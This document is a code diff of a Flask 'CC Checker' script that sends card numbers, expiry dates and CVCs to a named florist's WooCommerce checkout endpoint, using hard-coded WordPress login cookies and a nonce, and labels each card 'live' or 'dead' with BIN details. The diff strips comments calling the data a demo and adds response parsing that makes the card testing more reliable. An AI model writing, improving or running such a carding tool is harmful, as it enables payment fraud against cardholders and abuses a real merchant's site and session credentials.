@@ -1,12 +1,12 @@
 from flask import Flask, request, jsonify
 import requests
 import random
+import json
 
 app = Flask(__name__)
 
-# Fake data for demo (real use mein DevTools se nikaal)
 SITE = "nashvillefloristllc.com"
-NONCE = "6a1ff713de"  # Change if expired
+NONCE = "6a1ff713de"
 COOKIES = {
     "wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798": "usljfjae2q|1762849683|QMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo|c6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316",
     "__stripe_mid": "588bccab-9133-4397-b3e2-f2785fdd613ca53fc1",
@@ -40,13 +40,13 @@ def get_bin(cc):
 
 @app.route('/')
 def home():
-    return jsonify({"msg": "CC Checker Ready! Use /cc=number|mm|yy|cvc"})
+    return jsonify({"msg": "CC Checker Live! Use /cc=number|mm|yy|cvc"})
 
 @app.route('/cc=<path:cc_data>')
 def check_cc(cc_data):
     parts = cc_data.split('|')
     if len(parts) != 4:
-        return jsonify({"status": "error", "msg": "Invalid format. Use: number|mm|yy|cvc"}), 400
+        return jsonify({"status": "error", "msg": "Use: number|mm|yy|cvc"}), 400
 
     cc, mm, yy, cvc = parts
 
@@ -55,7 +55,6 @@ def check_cc(cc_data):
 
     bin_info = get_bin(cc)
 
-    # Fake PM_ID for demo
     pm_id = f"pm_1{random.randint(100000000,999999999)}kXn{random.randint(100000,999999)}"
 
     headers = {
@@ -75,7 +74,29 @@ def check_cc(cc_data):
 
     try:
         r = requests.post(f"https://{SITE}/wp-admin/admin-ajax.php", headers=headers, data=payload, cookies=COOKIES, timeout=15)
-        result = r.json()
+        
+        # FIX: Try JSON, if fail → parse text
+        try:
+            result = r.json()
+        except:
+            # If JSON fails, check raw text
+            text = r.text.strip()
+            if "success" in text.lower():
+                return jsonify({
+                    "status": "live",
+                    "msg": "Card Live! (parsed from text)",
+                    "cc": cc,
+                    "last4": cc[-4:],
+                    "bin_info": bin_info
+                })
+            else:
+                return jsonify({
+                    "status": "dead",
+                    "msg": "Declined (raw response)",
+                    "cc": cc,
+                    "bin_info": bin_info,
+                    "raw": text[:200]
+                })
 
         if result.get("result") == "success":
             return jsonify({
@@ -83,18 +104,18 @@ def check_cc(cc_data):
                 "msg": "Card Live!",
                 "cc": cc,
                 "last4": cc[-4:],
-                "bin_info": bin_info,
-                "site": SITE
+                "bin_info": bin_info
             })
         else:
-            msg = result.get("messages", "Declined").replace("<div class=\"woocommerce-error\">", "").replace("</div>", "").strip()
+            msg = result.get("messages", "Declined")
+            msg = msg.replace("<div class=\"woocommerce-error\">", "").replace("</div>", "").strip()
             return jsonify({
                 "status": "dead",
                 "msg": msg,
                 "cc": cc,
-                "bin_info": bin_info,
-                "site": SITE
+                "bin_info": bin_info
             })
+
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
 
